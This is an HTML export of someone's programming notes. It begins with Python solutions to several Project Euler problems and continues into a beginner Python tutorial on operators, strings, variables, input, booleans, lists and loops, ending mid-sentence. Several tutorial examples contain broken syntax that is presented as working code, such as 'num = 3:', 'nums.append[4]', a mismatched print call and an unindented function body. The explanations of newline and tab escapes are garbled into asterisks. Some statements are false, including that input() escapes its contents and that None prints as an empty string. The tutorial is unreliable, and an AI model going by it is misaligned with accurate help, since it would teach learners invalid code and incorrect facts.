    string = ''
    if len(number) == 3:
        string += dict1[int(number[0])] + 'hundred'
        if int(number[1]) == 1:
            string += 'and' + dict3[int(number)%100]
            return len(string)
        elif int(number[1]) == 0 and int(number[2]) == 0:
            return len(string)
        else:
            string += 'and' + dict2[int(number[1])] + dict1[int(number[2])]
            return len(string)
    elif len(number) == 2:
        if int(number[0]) == 1:
            string += dict3[int(number)]
            return len(string)
        else:
            string = string + dict2[int(number[0])] + dict1[int(number[1])]
            return len(string)
    else:
        string += dict1[int(number)]
        return len(string)
sum1 = 0
for i in range(1,1000):
    sum1 += l(str(i))

print(sum1+11)
</code></pre>
<p>#20.py</p>
<pre><code class="language-py">def fact(x):
    if  x == 1:
        return 1
    else:
        return x*fact(x-1)
sum = 0
for i in str(fact(100)):
    sum += int(i)

print(sum)
</code></pre>
<p>#21.py</p>
<pre><code class="language-py">def sum(i):
    sum1 = 0
    for j in range(1,i):
        if i%j == 0:
            sum1 += j
    if i != sum1:
        return sum1
    return 0


def amic():
    i = 10000
    while i &gt; 1:
        if i == sum(sum(i)):
            yield i
        i -= 1

finalsum = 0
nums = []
for i in amic():
    nums.append(i)
    print(i,sum(i))
    finalsum += i

print(nums, finalsum)
</code></pre>
<p>#23.py</p>
<pre><code class="language-py">def abun_nums():
    i = 1
    while i &lt; 28123:
        sum_div = 0
        for j in range(1,i):
            if i%j == 0:
                sum_div += j
        if sum_div &gt; i:
            yield i
        else:
            yield 0
        i += 1

num_list = {i for i in range(1,28124)}
abun_num_list = []
for i in abun_nums():
    if i != 0:
        abun_num_list.append(i)
#print(abun_num_list)

for i in range(0,len(abun_num_list)):
    for j in range(i,len(abun_num_list)):
        if abun_num_list[i] + abun_num_list[j] in num_list:
            num_list.remove(abun_num_list[i]+abun_num_list[j])

#print(num_list)
sum = 0
for i in num_list:
    sum += i

print(sum)
</code></pre>
<p>#25.py</p>
<pre><code class="language-py">def prod(arr1,arr2):
    return [[arr1[0][0]*arr2[0][0]+arr1[0][1]*arr2[1][0],arr1[0][0]*arr2[0][1]+arr1[0][1]*arr2[1][1]],[arr1[1][0]*arr2[0][0]+arr1[1][1]*arr2[1][0],arr1[1][0]*arr2[0][1]+arr1[1][1]*arr2[1][1]]]

def power(n):
    M = [[1,1],[1,0]]
    if n == 0 or n == 1:
        return M
    elif n%2 == 1:
        return(prod(prod(power(n//2),power(n//2)),M))
    else:
        return(prod(power(n//2),power(n//2)))
i = 1
while True:
    i += 1
    if len(str(power(i)[0][0])) == 1000:
        print(i+1)
        break
    else:
        continue
</code></pre>
<p>#48.py</p>
<pre><code class="language-py">sum = 0
for i in range (1,1001):
    sum += i**i

print(sum%10**10)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="python"><a class="header" href="#python">python</a></h1>
<h2 id="simple-operations"><a class="header" href="#simple-operations">Simple Operations</a></h2>
<p>Python has the capability of carrying out calculations. Enter a
calculation directly into a print statement:</p>
<pre><code class="language-py">print(2 + 2)
print(5 + 4 -3)
</code></pre>
<blockquote>
<p>The spaces around the plus and the minus signs here are <strong>optional</strong>
(the code would work without them) but they make it easier to read.</p>
</blockquote>
<p>Python also carries out multiplication and division, using an <strong>asterisk
*</strong> to indicate multiplication and a <strong>forward slash /</strong> to indicate
division.</p>
<p>Use <strong>parentheses</strong> to determine which operations are performed first.</p>
<pre><code class="language-py">print(2*(3+4))
print(10/2)
</code></pre>
<blockquote>
<p>Using a single slash to divide numbers produces a decimal (or
<em><strong>float</strong></em>, as it is called in programming). We’ll learn more about
<strong>floats</strong> later.</p>
</blockquote>
<p>Dividing by zero produces an <strong>error</strong> in python, as no answer can be
calculated.</p>
<pre><code class="language-py"> print(11/0)

 Traceback(most recent call last):
  File"\&lt;stdin\&gt;", line 1, in \&lt;module\&gt;
 ZeroDivisionError: division by zero
</code></pre>
<blockquote>
<p>In python, the last line of an error message indicates the error’s
type. Read error messages carefully, as they often tell you how to fix
a program!</p>
</blockquote>
<hr />
<h3 id="floats"><a class="header" href="#floats">Floats</a></h3>
<p><strong>Floats</strong> are used in python to represent numbers that <strong>aren’t
integers</strong> (whole numbers). Some examples of numbers that are
represented as floats are 0.5 and -7.8538953. They can be created
directly by entering a number with a decimal point, or by using
operations such as division on integers.</p>
<pre><code class="language-py">print(3/4)
</code></pre>
<blockquote>
<p>Computers can’t store floats perfectly accurately, in the same way we
can’t write down the complete decimal expansion of 1/3
(0.333333333…). Keep this in mind, because it often leads to
infuriating bugs!</p>
</blockquote>
<p>A float is also produced by running an operation on two floats, or on a
float and an integer.</p>
<blockquote>
<p>A float can be added to an integer, because Python silently converts
the ineger to a float.</p>
</blockquote>
<hr />
<h3 id="exponentiation"><a class="header" href="#exponentiation">Exponentiation</a></h3>
<p>Besides addition, subtraction, multiplication, and division, Python also
supports exponentiation, which is raising of one number to the power of
another. This operation is performed using two asterisks.</p>
<pre><code class="language-py">print(2**5)
print(9**(1/2))
</code></pre>
<blockquote>
<p>You can chain exponentiation together. In other words, you can raise a
number to multiple powers. Eg. 2**3**2</p>
</blockquote>
<hr />
<h3 id="quotient"><a class="header" href="#quotient">Quotient</a></h3>
<p><strong>Floor division</strong> is done using two forward slashes and is used to
determine the <strong>quotient</strong> of a division (the quantity produced by the
division of two numbers).</p>
<p><strong>For example:</strong></p>
<pre><code class="language-py">print(20//6)
</code></pre>
<p>The code above will output 3. &gt;You can also use floor division on
floats</p>
<hr />
<h3 id="remainder"><a class="header" href="#remainder">Remainder</a></h3>
<p>The <strong>modulo operator</strong> is carried out with a percent symbol (%) and is
used to get the <strong>remainder</strong> of a division.</p>
<p><strong>For example:</strong></p>
<pre><code class="language-py">print(20%6)
print(1.25%0.5)
</code></pre>
<blockquote>
<p>All numerical operators can also be used with floats.</p>
</blockquote>
<hr />
<h2 id="strings-1"><a class="header" href="#strings-1">Strings</a></h2>
<p>If you want to use text in python, you have to use a <em>string</em>. A
<em>string</em> is created by entering text between <strong>two single or double
quotation marks.</strong></p>
<pre><code class="language-py">print("Python is fun!")
print("Always look on the bright side")
</code></pre>
<blockquote>
<p>The delimiter (“ or ’) used for a string doesn’t affect how it behaves
in any way.</p>
</blockquote>
<hr />
<h3 id="backslash"><a class="header" href="#backslash">Backslash</a></h3>
<p>Some characters cant be directly included in a <em>string</em>. For instance,
double quotes can’t be directly included in a double quote <em>string</em>;
this would cause it to end prematurely.</p>
<p>Characters like double quotes must be escaped by placing a <strong>backslash</strong>
before them. Double quotes need to be escaped in double quotes strings
only, and the same is true for single quotes strings. <strong>For Example:</strong></p>
<pre><code class="language-py">print('Brian\'s mother: He\'s not an angel. He\'s a naughty boy!')
</code></pre>
<blockquote>
<p>Backslashes can also be used to escape tabs, arbitrary Unicode
characters, and various other things that can’t be reliably printed.</p>
</blockquote>
<hr />
<h3 id="newlines"><a class="header" href="#newlines">Newlines</a></h3>
<p>*** represents a new line. It can be used in strings to create
multi-line output.</p>
<pre><code class="language-py">print('One **\n** Two **\n** Three')
</code></pre>
<p>Newlines will automatically be added for strings that are created using
three quotes.</p>
<pre><code class="language-py">print("""This
is a
multiline
text""")
</code></pre>
<blockquote>
<p>Similarly, ** represents a tab.</p>
</blockquote>
<hr />
<h3 id="concatenation"><a class="header" href="#concatenation">Concatenation</a></h3>
<p>As with integers and floats, strings in Python can be added, using a
process called <em>concatenation</em>, which can be done on any two strings.</p>
<pre><code class="language-py">print("Spam" + 'eggs')
</code></pre>
<blockquote>
<p>When concatenating strings, it doesn’t matter whether they have been
created with single or double quotes, as seen above</p>
</blockquote>
<blockquote>
<p>Adding a string to a number produces an error, as even though they
might look similar, they are two different entities</p>
</blockquote>
<hr />
<h3 id="string-operations"><a class="header" href="#string-operations">String Operations</a></h3>
<p>Strings can also be <strong>multiplied</strong> with integers. This produces a
repeated version of that <em>string</em>. The order of the <em>string</em> and the
<em>integer</em> doesn’t matter, but the <em>string</em> usually comes first.</p>
<pre><code class="language-py">print("spam"*3)

print(4*'2')
</code></pre>
<blockquote>
<p>Strings can’t be multiplied with other strings. Strings also can’t be
multiplied by floats, even if the floats are whole numbers.</p>
</blockquote>
<hr />
<h2 id="variables-1"><a class="header" href="#variables-1">Variables</a></h2>
<p>A <em>variable</em> allows you to store a value by assigning it to a name,
which can be used to refer to the value later in the program. For
example, in game development, you would use a <em>variable</em> to to store the
points of the player.</p>
<p>To assign a <em>variable</em>, use <strong>one equals sign</strong>.</p>
<pre><code class="language-py">user = "James"
</code></pre>
<p>You can use variables to perform corresponding operations, just as you
did with numbers and strings:</p>
<pre><code class="language-py">x = 7
print(x)

print(x + 3)
print(x)
</code></pre>
<blockquote>
<p>The <em>variable</em> stores its value throughout the program.</p>
</blockquote>
<p>Variables can be assigned as many times as you want, in order to change
their value. In python, variables don’t have specific types, so you can
assign a <em>string</em> to a <em>variable</em>, and later assign an <em>integer</em> to the
same <em>variable</em>.</p>
<pre><code class="language-py">x = 123.456
print(x)

x = "This is a string"
print(x+"!")
</code></pre>
<blockquote>
<p>However, this is not a good practice. To avoid mistakes, try to avoid
overwriting the same <em>variable</em> with different data types.</p>
</blockquote>
<hr />
<h3 id="variable-names"><a class="header" href="#variable-names">Variable Names</a></h3>
<p>Certain restrictions apply in regard to the characters that may be used
in python <em>variable</em> names. The only characters that are allowed are
<strong>letters, numbers and underscore</strong>. Also, they can’t start with
numbers. Not following these rules results in errors.</p>
<pre><code class="language-py">this_is_a_normal_name = 7

123abc = 7
SyntaxError: invalid syntax
</code></pre>
<blockquote>
<p>Python is a case sensitive programming language. Thus, <strong>lastname</strong>
and <strong>Lastname</strong> are two different <em>variable</em> names in python.</p>
</blockquote>
<hr />
<p>You can use the <strong>del</strong> statement to remove a <em>variable</em>, which means
the reference from the name to the value is deleted, and trying to use
the <em>variable</em> causes an error.</p>
<pre><code class="language-py">foo = 3
del foo
print(foo)
</code></pre>
<p>Deleted variables can also e reassigned to later as normal.</p>
<pre><code class="language-py">foo = 2
bar = 3
del bar
bar = 8
print(foo + bar)
</code></pre>
<blockquote>
<p>The variables <strong>foo</strong> and <strong>bar</strong> are called <strong>metasyntactic</strong>
variables, meaning they are used as placeholder names in example code
to demonstrate something.</p>
</blockquote>
<hr />
<h2 id="input"><a class="header" href="#input">Input</a></h2>
<p>To get input from the user in python, you can use the intuitively named
<strong>input</strong> <em>function</em>. For example, a game can ask for a user’s name and
age as input and use them in the game.</p>
<p>The input <em>function</em> prompts the user for input, and returns what they
enter as a <em>string</em> (with the contents automatically escaped).</p>
<pre><code class="language-py">x = input()
print(x)
</code></pre>
<blockquote>
<p>Even if the user enters a number as an input, it is processed as a
<strong>string</strong>.</p>
</blockquote>
<p>The <strong>input</strong> statement needs to be followed by parentheses. You can
provide a <em>string</em> to <strong>input()</strong> between the parentheses, producing a
prompt message.</p>
<pre><code class="language-py">name = input("Enter your name: ")
print("Hello"+name)
</code></pre>
<blockquote>
<p>The prompt message helps clarify what the input is asking for.</p>
</blockquote>
<p>To convert the string to a number, we can use the <strong>int()</strong> <em>function</em>:</p>
<pre><code class="language-py">age =int(input())
print(age)
</code></pre>
<p>Similarly, in order to convert a number to a <em>string</em>, the str()
<em>function</em> is used. This can be useful if you need to use a number in
<em>string concatenation</em>. <strong>For example:</strong></p>
<pre><code class="language-py">age = 42
print("His age is" + str(age))
</code></pre>
<blockquote>
<p>You can convert to float using the float() function.</p>
</blockquote>
<p>You can take input multiple times to take multiple user input. <strong>For
example:</strong></p>
<pre><code class="language-py">name = input()
age = input()

print(name + "is" + age)
</code></pre>
<blockquote>
<p>When input function executes, program flow stops until the user enters
some value.</p>
</blockquote>
<hr />
<h2 id="in-place-operators"><a class="header" href="#in-place-operators">In Place Operators</a></h2>
<p><strong>In-place operators</strong> allow you to write code like <code>x = x + 3</code> more
concisely as <code>x +=3</code> . The same thing is possible with other operators
such as <strong>-,*, /, and %</strong> as well.</p>
<pre><code class="language-py">x = 2
print(x)

x += 3
print(x)
</code></pre>
<p>These operators can be used on types other than numbers, as well, such
as <strong>strings.</strong></p>
<pre><code class="language-py">x= "spam"
print(x)

x += "eggs"
print(x)
</code></pre>
<blockquote>
<p>In-place operators can be used for any numerical operation
(+,-,*,/,%,**,//).</p>
</blockquote>
<hr />
<h2 id="booleans-1"><a class="header" href="#booleans-1">Booleans</a></h2>
<p>Another type in python is the <em>Boolean</em> type. There are two <em>Boolean</em>
values: <strong>True</strong> and <strong>False</strong>. They can be created by comparing values,
for instance by using the equal to ==.</p>
<pre><code class="language-py">my_boolean = True
print(my_boolean)
True

print(2 == 3)
False

print("hello" == 'hello')
True
</code></pre>
<blockquote>
<p><em>Be careful not to confuse <strong>assignment</strong> (one equal sign) with
<strong>comparison</strong> (two equal signs).</em></p>
</blockquote>
<hr />
<h3 id="comparison"><a class="header" href="#comparison">Comparison</a></h3>
<p>Another comparison operator, the <strong>not equal</strong> operator (!=), evaluates
to <strong>True</strong> if the items being compared aren’t equal, and <strong>False</strong> if
they are.</p>
<pre><code class="language-py">print(1 != 1)
False

print("eleven" != "seven")
True

print(2 != 10)
True
</code></pre>
<blockquote>
<p><em>Comparison operators are also called <strong>relational operators</strong>.</em></p>
</blockquote>
<p>Python also has operators that determine whether one number (float or
integer) is greater than or smaller than another. These operators are &gt;
and &lt; respectively.</p>
<pre><code class="language-py">print(7 &gt; 5)
True

print(10 &lt; 10)
False
</code></pre>
<blockquote>
<p><em>Different numeric types can also be compared, for example, integer
and float.</em></p>
</blockquote>
<p>The greater than or equal to, and the smaller than or equal to operators
are &gt;= and &lt;=. They are the same as the strict greater than and
smaller than operators, except that they return <strong>True</strong> when comparing
equal numbers.</p>
<pre><code class="language-py">print(7&lt;= 8)
True

print(9&gt;=9.0)
True
</code></pre>
<p>Greater than and smaller than operators can also be used to compare
strings <strong>lexicographically</strong>. <strong>For Example:</strong></p>
<pre><code class="language-py">print("Annie" &gt; "Andy")
True
</code></pre>
<hr />
<h3 id="if-statements"><a class="header" href="#if-statements">If statements</a></h3>
<p>You can use <strong>if</strong> statements to run code if a certain condition holds.
If the expression evaluates to <strong>True</strong>, some statements are carried
out.Otherwise they aren’t carried out. An if statement looks like this:</p>
<pre><code class="language-py">if expression:
    statements
</code></pre>
<blockquote>
<p><em>Python uses <strong>indentation</strong>, (white spaces at the beginning of a
line) to delimit blocks of code. Depending on the program’s logic,
indentation can be mandatory. As you can see, the statements in the
<strong>if</strong> should be indented.</em></p>
</blockquote>
<p>Here is an example of <strong>if</strong> statement:</p>
<pre><code class="language-py">if 10 &gt; 5:
    print("10 is greater than 5")

print("The program ended")
</code></pre>
<p>The expression determines whether 10 is greater than 5. Since it is, the
indented statement runs, and “10 is greater than 5” is output. Then, the
unindented statement, which is not a part of the <strong>if</strong> statement, is
run, and “Program ended” is displayed.</p>
<blockquote>
<p><em>Notice the <strong>colon</strong> at the end of the expression in the if
statement.</em></p>
</blockquote>
<p>To perform more complex checks, <strong>if</strong> statements can be nested, one
inside the other. This means that the inner <strong>if</strong> statement is the
statement part of the outer one. This is one way to see whether multiple
conditions are satisfied.</p>
<p><strong>For example:</strong></p>
<pre><code class="language-py">num = 12
if num &gt; 5:
    print("Bigger than 5")
    if num &lt;= 47:
        print("between 5 and 47")
</code></pre>
<blockquote>
<p><em><strong>Indentation</strong> is used to define the level of nesting.</em></p>
</blockquote>
<hr />
<h4 id="else-statements"><a class="header" href="#else-statements">else Statements</a></h4>
<p>The <strong>if</strong> statement allows you to check a condition and run some
statements, if the condition is <strong>True</strong>. The <strong>else</strong> statement can be
used to run some statements when the condition of the <strong>if</strong> statement
is <strong>False</strong>.</p>
<p>As with <strong>if</strong> statements, the code inside the block should be indented.</p>
<pre><code class="language-py">x = 4
if x == 5:
    print("Yes")
else:
    print("No")
</code></pre>
<blockquote>
<p><em>Notice the colon after the else keyword.</em></p>
</blockquote>
<p>Every <strong>if</strong> condition block can have only one <strong>else</strong> statement. In
order to make multiple checks, you can chain <strong>if</strong> and <strong>else</strong>
statements.</p>
<p>For example, the following program checks and outputs the <strong>num</strong>
variable’s value as text:</p>
<pre><code class="language-py">num = 3
if num == 1:
    print("One")
else:
    if num == 2:
        print("Two")
    else:
        if num == 3:
            print("Three")
</code></pre>
<blockquote>
<p><em>Indentation determines which <strong>if/else</strong> statements the code blocks
belong to.</em></p>
</blockquote>
<hr />
<h4 id="elif-statements"><a class="header" href="#elif-statements">elif Statements</a></h4>
<p>Multiple <strong>if/else</strong> statements make the code long and not very
readable. The <strong>elif</strong> (short for else if) statement is a shortcut to
use when chaining <strong>if</strong> and <strong>else</strong> statements, making the code
shorter.</p>
<p>The same example from the previous part can be rewritten using <strong>elif</strong>
statements:</p>
<pre><code class="language-py">num = 3:
if num == 1:
    print("One")
elif num == 2:
    print("Two")
elif num == 3:
    print("Three")
else:
    print("None are true")
</code></pre>
<p>As you can see in the example above, a series of <strong>if elif</strong> statements
can have a final <strong>else</strong> block, which is called if none of the <strong>if</strong>
or <strong>elif</strong> expressions is <strong>True</strong>.</p>
<blockquote>
<p>The <strong>elif</strong> statement is
equivalent to an <strong>else/if</strong> statement. It is used to make the code
shorter, more readable, and avoid indentation increase.</p>
</blockquote>
<hr />
<h3 id="boolean-logic"><a class="header" href="#boolean-logic">Boolean Logic</a></h3>
<p><strong>Boolean logic</strong> is used to make more complicated conditions for <strong>if</strong>
statements that rely on more than one condition. Python’s Boolean
operators are <strong>and</strong>, <strong>or</strong>, and <strong>not</strong>. The <strong>and</strong> operator takes
two arguments, and evaluates as <strong>True</strong> if, and only if, both of its
arguments are <strong>True</strong>. Otherwise, it evaluates to <strong>False</strong>.</p>
<pre><code class="language-py">print( 1 == 1 and 2 == 2)
True

print(1 == 1 and 2 == 3)
False

print( 1 != 1 and 2 &gt; 3)
False

print( 2 &lt; 3 and 3 &gt; 6)
False
</code></pre>
<blockquote>
<p>Boolean operators can be used in expression as many times as needed.</p>
</blockquote>
<p>The <strong>or</strong> operator also takes two arguments. It evaluates to <strong>True</strong>
if either (or both) of its arguments are <strong>True</strong>, and <strong>False</strong> if both
arguments are <strong>False</strong>.</p>
<pre><code class="language-py">print( 1 == 1 or 2 == 2)
True

print(1 == 1 or 2 == 3)
True

print( 1 != 1 or 2 &gt; 3)
False

print( 2 &lt; 3 or 3 &gt; 6)
True
</code></pre>
<blockquote>
<p>Besides values, you can also compare variables.</p>
</blockquote>
<p>Unlike other operators we’ve seen so far, <strong>not</strong> only takes one
argument, and inverts it. The result of <strong>not True</strong> is <strong>False</strong>, and
<strong>not False</strong> goes to <strong>True</strong></p>
<pre><code class="language-py">print( not 1 == 1)
False

print( not 1 &gt; 7)
True
</code></pre>
<blockquote>
<p>You can chain multiple conditional statements in an <strong>if</strong> statement
using the Boolean operators.</p>
</blockquote>
<hr />
<h4 id="operator-precedence"><a class="header" href="#operator-precedence">Operator Precedence</a></h4>
<p><strong>Operator precedence</strong> is a very important concept in programming. It
is an extension of the mathematical idea of order of operations
(multiplication being performed before addition, etc.) to include other
operators, such as those in Boolean logic.</p>
<p>The below code shows that <strong>==</strong> has a higher precedence than <strong>or</strong></p>
<pre><code class="language-py">print(False == False or True)
True

print(False == (False or True))
False

print((False == False) or True)
True
</code></pre>
<blockquote>
<p>Python’s order of operations is the same as that of normal
mathematics: parentheses first, then exponentiation, then
multiplication/division, and then addition/subtraction.</p>
</blockquote>
<hr />
<h4 id="chaining-multiple-conditions"><a class="header" href="#chaining-multiple-conditions">Chaining Multiple Conditions</a></h4>
<p>You can chain multiple conditional statements in an <strong>if</strong> statement
using the Boolean operators.</p>
<p>For example, we can check if the value of a <strong>grade</strong> is between 70 and
100:</p>
<pre><code class="language-py">grade = 88
if (grade &gt;= 70 and grade &lt;= 100):
    print("Passed!")
</code></pre>
<blockquote>
<p>You can use multiple <strong>and</strong>, <strong>or</strong>, <strong>not</strong> operators to chain
multiple conditions together.</p>
</blockquote>
<hr />
<h2 id="none"><a class="header" href="#none">None</a></h2>
<p>The <strong>None</strong> object is used to represent the absence of a value. It is
similar to <strong>null</strong> in other programming languages. Like other “empty”
values, such as 0, [] and the empty string, it is <strong>False</strong> when
converted to a Boolean variable. When entered at the Python console, it
is displayed as the empty string.</p>
<pre><code class="language-py">print(None)
</code></pre>
<blockquote>
<p>Run the code and see how it works!</p>
</blockquote>
<p>The <strong>None</strong> object is returned by any function that doesn’t explicitly
return anything else.</p>
<pre><code class="language-py">def some_func():
print("Hi!")
var = some_func()
print(var)
</code></pre>
<hr />
<h2 id="lists"><a class="header" href="#lists">Lists</a></h2>
<p><strong>Lists</strong> are used to store items. A list is created using <strong>square
brackets</strong> with <strong>commas</strong> separating items.</p>
<pre><code class="language-py">words = ["Hello", "world", "!"]
</code></pre>
<p>In the example above the words list contains three string items.</p>
<p>A certain item in the list can be accessed by using its index in square
brackets.</p>
<p><strong>For example:</strong></p>
<pre><code class="language-py">words = ["Hello", "world", "!"]
print(words[0])
print(words[1])
print(words[2])
</code></pre>
<blockquote>
<p>The first list item’s index is <strong>0</strong>, rather than 1, as might be
expected.</p>
</blockquote>
<p>Sometimes you need to create an empty list and populate it later during
the program. For example, if you are creating a queue management
program, the queue is going to be empty in the beginning and get
populated with people data later.</p>
<p>An empty list is created with an empty pair of square brackets.</p>
<pre><code class="language-py">empty_list = []
print(empty_list)
</code></pre>
<blockquote>
<p>In some code samples you might see a comma after the last item in the
list. It’s not mandatory, but perfectly valid.</p>
</blockquote>
<p>Typically, a list will contain items of a single item type, but it is
also possible to include several different types. Lists can also be
nested within other lists.</p>
<pre><code class="language-py">number = 3
things = ["string",  0,  [1,  2, number],  4.56]
print(things[1])
print(things[2])
print(things[2][2])
</code></pre>
<p>Nested lists can be used to represent 2D grids, such as matrices. <strong>For
example:</strong></p>
<pre><code class="language-py">m = [[0,1,2],[4,5,6]]
print(list([1][2])
</code></pre>
<p>A matrix-like structure can be used in cases where you need to store
data in row-column format. For example, when creating a ticketing
program, the seat numbers can be stored in a matrix, with their
corresponding rows and numbers. &gt;The code above outputs the 3rd item of
the 2nd row.</p>
<p>Some types, such as <strong>strings</strong>, can be indexed like lists. Indexing
<strong>strings</strong> behaves as though you are indexing a list containing each
character in the string.</p>
<p><strong>For example:</strong></p>
<pre><code class="language-py">string = "Hello world"
print(string[6])
</code></pre>
<p>Space (“ “) is also a symbol and has an index.</p>
<blockquote>
<p>Trying to access a non existing index will lead to an error.</p>
</blockquote>
<hr />
<h3 id="list-operations"><a class="header" href="#list-operations">List Operations</a></h3>
<p>The item at a certain index in a list can be reassigned. <strong>For
example:</strong></p>
<pre><code class="language-py">list = [0,1,2,3,4]
list[2] = 5
print(list)
</code></pre>
<blockquote>
<p>You can replace the item with an item of a different type.</p>
</blockquote>
<p>Lists can be added and multiplied in the same way as strings. <strong>For
example:</strong></p>
<pre><code class="language-py">nums = [0,1,2]
print(nums + [3,4,5])
print(nums*3)
</code></pre>
<p>Lists and strings are similar in many ways - strings can be thought of
as lists of characters that can’t be changed.</p>
<blockquote>
<p>For example, the string “Hello” can be thought of as a list, where
each character is an item in the list. The first item is “H”, the
second item is “e”, and so on.</p>
</blockquote>
<p>To check if an item is in a list, the <strong>in</strong> operator can be used. It
returns <strong>True</strong> if the item occurs one or more times in the list, and
<strong>False</strong> if it doesn’t.</p>
<pre><code class="language-py">words = ["spam",  "egg",  "spam",  "sausage"]
print("spam"  in words)
print("egg"  in words)
print("tomato"  in words)
</code></pre>
<blockquote>
<p>The <strong>in</strong> operator is also used to determine whether or not a string
is a substring of another string.</p>
</blockquote>
<p>To check if an item is not in a list, you can use the <strong>not</strong> operator
in one of the following ways:</p>
<pre><code class="language-py">nums = [1,  2,  3]
print(not  4  in nums)
print(4  not  in nums)
print(not  3  in nums)
print(3  not  in nums)
</code></pre>
<hr />
<h3 id="list-functions"><a class="header" href="#list-functions">List Functions</a></h3>
<p>The <strong>append</strong> method adds an item to the end of an existing list. <strong>For
example:</strong></p>
<pre><code class="language-py">nums = [1,2,3]
nums.append[4]
print(nums)
</code></pre>
<blockquote>
<p>The <strong>dot</strong> before append is there because it is a <strong>method</strong> of the
list class. Methods will be explained in later.</p>
</blockquote>
<p>To get the number of items in a list, you can use the <strong>len</strong> function.</p>
<pre><code class="language-py">list = [0,1,2,3,4]
print(len(list))
</code></pre>
<p>Unlike the index of the items, <strong>len</strong> does not start with 0. So, the
list above contains 5 items, meaning <strong>len</strong> will return 5.</p>
<blockquote>
<p><strong>len</strong> is written before the list it is being called on, without a
dot.</p>
</blockquote>
<p>The <strong>insert</strong> method is similar to <strong>append</strong>, except that it allows
you to insert a new item at any position in the list, as opposed to just
at the end.</p>
<pre><code class="language-py">words = ["Python",  "fun"]
index = 1
words.insert(index,  "is")
print(words)
</code></pre>
<blockquote>
<p>Elements, that are after the inserted item, are shifted to the right.</p>
</blockquote>
<p>The <strong>index</strong> method finds the first occurrence of a list item and
returns its index. If the item isn’t in the list, it raises a
<code>ValueError</code>.</p>
<pre><code class="language-py">letters = ['p',  'q',  'r',  's',  'p',  'u']
print(letters.index('r'))
print(letters.index('p'))
print(letters.index('z'))
</code></pre>
<p>There are a few more useful functions and methods for lists.</p>
<p><strong>max</strong>(list): Returns the list item with the maximum value</p>
<p><strong>min</strong>(list): Returns the list item with minimum value</p>
<p>list.<strong>count</strong>(item): Returns a count of how many times an item occurs
in a list.</p>
<p>list.<strong>remove</strong>(item): Removes an object from a list</p>
<p>list.<strong>reverse</strong>(): Reverses items in a list.</p>
<blockquote>
<p>For example, you can count how many 42s are there in the list using:
<strong>items.count(42)</strong> where <strong>items</strong> is the name of our list.</p>
</blockquote>
<hr />
<h2 id="while-loops-1"><a class="header" href="#while-loops-1">while Loops</a></h2>
<p>A <strong>while</strong> loop is used to repeat a block of code multiple times. For
example, let’s say we need to process multiple user inputs, so that each
time the user inputs something, the same block of code needs to execute.</p>
<p>Below is a <strong>while</strong> loop containing a variable that counts up from 1 to
5, at which point the loop terminates.</p>
<pre><code class="language-py">i = 1
while i &lt;=5:
    print(i)
    i += 1
print("Finished!")
</code></pre>
<p>During each loop iteration, the i variable will get incremented by one,
until it reaches 5. So, the loop will execute the print statement 5
times.</p>
<blockquote>
<p>The code in the body of a <strong>while</strong> loop is executed repeatedly. This
is called <strong>iteration</strong>.</p>
</blockquote>
<p>You can use multiple statements in the while loop.</p>
<p>For example, you can use an <strong>if</strong> statement to make decisions. This can
be useful, if you are making a game and need to loop through a number of
player actions and add or remove points of the player.</p>
<p>The code below uses an if/else statement inside a while loop to separate
the even and odd numbers in the range of 1 to 10:</p>
<pre><code class="language-py">x = 1
while x &lt;= 10:
    if x%2 == 0:
        print(str(x) + "is even")
    else:
        print(str(x) + "is odd")
    x += 1
</code></pre>
<p><strong>str(x)</strong> is used to convert the number x to a string, so that it can
be used for concatenation.</p>
<blockquote>
<p>In console, you can stop the program’s execution by using the Ctrl-C
shortcut or by closing the program.</p>
</blockquote>
<hr />
<h3 id="break"><a class="header" href="#break">break</a></h3>
<p>To end a <strong>while</strong> loop prematurely, the <strong>break</strong> statement can be
used. For example, we can break an infinite loop if some condition is
met:</p>
<pre><code class="language-py">i = 0
while  1==1:
    print(i)
    i = i + 1
    if i &gt;= 5:
        print("Breaking")
        break
print("Finished")
</code></pre>
<p><strong>while True</strong> is a short and easy way to make an infinite loop.</p>
<p><strong>An example use case of break:</strong> An infinite while loop can be used to
continuously take user input. For example, you are making a calculator
and need to take numbers from the user to add and stop, when the user
enters <strong>“stop”</strong>. In this case, the <strong>break</strong> statement can be used to
end the infinite loop when the user input equals “stop”.</p>
<blockquote>
<p>Using the <strong>break</strong> statement outside of a loop causes an error.</p>
</blockquote>
<hr />
<h3 id="continue"><a class="header" href="#continue">continue</a></h3>
<p>Another statement that can be used within loops is <strong>continue</strong>. Unlike
<strong>break</strong>, <strong>continue</strong> jumps back to the top of the loop, rather than
stopping it. Basically, the <strong>continue</strong> statement stops the current
iteration and continues with the next one.</p>
<p><strong>For example:</strong></p>
<pre><code class="language-py">i = 0
while i&lt;5:
    i += 1
    if i==3:
        print("Skipping 3")
        continue
    print(i)
</code></pre>
<p><strong>An example use case of continue:</strong> An airline ticketing system needs
to calculate the total cost for all tickets purchased. The tickets for
children under the age of 1 are free. We can use a while loop to iterate
through the list of passengers and calculate the total cost of their
tickets. Here, the <strong>continue</strong> statement can be used to skip the
children.</p>
<blockquote>
<p>Using the <strong>continue</strong> statement outside of a loop causes an error.</p>
</blockquote>
<hr />
<h2 id="for-loop"><a class="header" href="#for-loop">for Loop</a></h2>
<p>The for loop is used to iterate over a given sequence, such as lists or
strings.</p>
<p>The code below outputs each item in the list and adds an exclamation
mark at the end:</p>
<pre><code class="language-py">words = ['hello', 'world']
for word in words:
    print(word + '!')
</code></pre>
<blockquote>
<p>In the code above, the word variable represents the corresponding item
of the list in each iteration of the loop. During the 1st iteration,
word is equal to “hello”, and during the 2nd iteration it’s equal to
“world”.</p>
</blockquote>
<p>The <strong>for</strong> loop can be used to iterate over strings.</p>
<p><strong>For example:</strong></p>
<pre><code class="language-py">str = "testing for loops"
count = 0
for x in  str:
    if(x == 't'):
        count += 1
print(count)
</code></pre>
<p>The code above defines a <strong>count</strong> variable, iterates over the string
and calculates the count of ‘t’ letters in it. During each iteration,
the <strong>x</strong> variable represents the current letter of the string. The
<strong>count</strong> variable is incremented each time the letter ‘t’ is found,
thus, at the end of the loop it represents the number of ‘t’ letters in
the string. &gt;Similar to <strong>while</strong> loops, the <strong>break</strong> and <strong>continue</strong>
statements can be used in <strong>for</strong> loops, to stop the loop or jump to the
next iteration.</p>
<hr />
<h3 id="for-vs-while"><a class="header" href="#for-vs-while">for vs while</a></h3>
<p>Both, <strong>for</strong> and <strong>while</strong> loops can be used to execute a block of code
for multiple times.</p>
<p>It is common to use the <strong>for</strong> loop when the number of iterations is
